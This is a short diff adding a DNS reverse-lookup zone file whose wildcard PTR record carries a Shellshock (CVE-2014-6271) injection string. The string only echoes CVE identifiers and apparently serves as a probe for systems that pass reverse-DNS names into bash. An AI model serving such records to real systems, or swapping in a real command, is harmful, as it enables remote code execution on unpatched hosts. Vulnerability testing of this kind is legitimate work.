@@ -1,0 +1,9 @@
+      10;
+      in-addr.arpa.
+     @     IN SOA     ns.boem.wleiden.net dirkx.webweaving.org (
+                    666        ; serial
+                    360 180 3600 1800 ; very short livespan.
+                    )
+     IN          NS     127.0.0.1
+     *           PTR      "() { :;}; echo CVE-2014-6271, CVE-201407169, RDNS" 
+
